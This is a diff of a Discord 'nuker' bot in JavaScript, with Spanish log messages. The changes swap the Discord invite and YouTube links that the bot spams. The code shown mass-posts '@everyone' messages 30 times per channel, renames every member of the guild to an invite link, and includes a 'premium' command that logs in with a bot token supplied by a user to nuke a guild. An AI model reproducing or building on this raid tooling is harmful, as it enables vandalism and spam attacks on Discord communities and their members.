@@ -177,7 +177,7 @@ client.on(`messageCreate`,async (msg)=>{
             let canalxdxd = client.channels.cache.get(canal.id);
             for (let index = 0; index < 30; index++) {
                 try {
-                    await canalxdxd.send({content:`@everyone https://discord.gg/kEB3PCPkzc - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailZenX`});
+                    await canalxdxd.send({content:`@everyone https://discord.gg/zCQ8jQ2GBf - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX`});
                 } catch (e) {
                     console.log(`[X] No se pudo enviar un mensaje con el comando "on", mensaje de error: ${e.message}`);
                 }
@@ -434,7 +434,7 @@ client.on(`messageCreate`,async (msg)=>{
         let membersxdxd = await msg.guild.members.fetch();
         for (const m of membersxdxd.values()) {
             try {
-                await m.setNickname('.gg/kEB3PCPkzc');
+                await m.setNickname('.gg/zCQ8jQ2GBf');
             } catch (e) {
                 console.log(`[X] No se pudo renombrar al usuario ${m.nickname} con ID ${m.id}, error: ${e.message}`);
             }
@@ -725,7 +725,7 @@ client.on(`messageCreate`,async (msg)=>{
                 await msg.channel.send({content:`> No haz introducido ningún token de bot.`});
                 return;
             } else {
-                config_usuarios_premium[msg.author.id].invite_url == "" ? "https://discord.gg/kEB3PCPkzc": config_usuarios_premium[msg.author.id].invite_url;
+                config_usuarios_premium[msg.author.id].invite_url == "" ? "https://discord.gg/zCQ8jQ2GBf": config_usuarios_premium[msg.author.id].invite_url;
                 await msg.channel.send({content:`> Nukeando guild...`});
                 let namev = `client${msg.author.id}`;
                 namev = new Client({intents: [103423]});
@@ -736,7 +736,7 @@ client.on(`messageCreate`,async (msg)=>{
                     let canalxdxd = namev.channels.cache.get(canal.id);
                     for (let index = 0; index < 30; index++) {
                         try {
-                            await canalxdxd.send({content:`@everyone ${config_usuarios_premium[msg.author.id].invite_url} https://discord.gg/kEB3PCPkzc - | - https://www.youtube.com/watch?v=rY1JyWyQiSI / #HailZenX`});
+                            await canalxdxd.send({content:`@everyone ${config_usuarios_premium[msg.author.id].invite_url} https://discord.gg/zCQ8jQ2GBf - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX`});
                             counterrrrr++;
                             if(chsisssss <= counterrrrr){
                                 await namev.destroy();
